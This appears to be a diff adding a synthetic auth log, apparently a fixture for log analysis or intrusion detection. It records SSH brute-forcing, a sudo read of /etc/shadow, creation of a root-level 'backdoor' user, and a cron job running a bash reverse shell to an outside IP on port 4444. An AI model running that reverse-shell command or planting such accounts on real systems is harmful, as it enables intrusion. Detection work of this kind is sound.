@@ -1,0 +1,22 @@
+Jan 15 10:00:01 webserver sshd[1234]: Accepted password for admin from 192.168.1.10 port 22 ssh2
+Jan 15 10:01:00 webserver sshd[1235]: Failed password for root from 10.0.0.55 port 55612 ssh2
+Jan 15 10:01:05 webserver sshd[1236]: Failed password for root from 10.0.0.55 port 55613 ssh2
+Jan 15 10:01:10 webserver sshd[1237]: Failed password for root from 10.0.0.55 port 55614 ssh2
+Jan 15 10:01:15 webserver sshd[1238]: Failed password for root from 10.0.0.55 port 55615 ssh2
+Jan 15 10:01:20 webserver sshd[1239]: Failed password for root from 10.0.0.55 port 55616 ssh2
+Jan 15 10:01:25 webserver sshd[1240]: Failed password for root from 10.0.0.55 port 55617 ssh2
+Jan 15 10:01:30 webserver sshd[1241]: Failed password for root from 10.0.0.55 port 55618 ssh2
+Jan 15 10:02:00 webserver sshd[1242]: Invalid user deploy from 185.220.101.42 port 43210
+Jan 15 10:02:05 webserver sshd[1243]: Invalid user ubuntu from 185.220.101.42 port 43211
+Jan 15 10:02:10 webserver sshd[1244]: Invalid user pi from 185.220.101.42 port 43212
+Jan 15 10:02:15 webserver sshd[1245]: Invalid user test from 185.220.101.42 port 43213
+Jan 15 10:03:00 webserver sudo[2001]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Jan 15 10:03:10 webserver sudo[2002]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/passwd
+Jan 15 10:04:00 webserver sshd[1250]: Accepted publickey for devops from 172.16.0.5 port 22 ssh2
+Jan 15 10:05:00 webserver sshd[1251]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.99 user=root
+Jan 15 10:05:05 webserver sshd[1252]: Failed password for root from 203.0.113.99 port 11111 ssh2
+Jan 15 10:06:00 webserver useradd[3001]: new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash
+Jan 15 10:07:00 webserver sshd[1260]: Accepted password for backdoor from 45.33.32.156 port 22 ssh2
+Jan 15 10:08:00 webserver sudo[2010]: backdoor : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
+Jan 15 10:09:00 webserver cron[4001]: (root) CMD (/bin/bash -i >& /dev/tcp/45.33.32.156/4444 0>&1)
+Jan 15 10:10:00 webserver sshd[1270]: Accepted password for admin from 192.168.1.10 port 22 ssh2
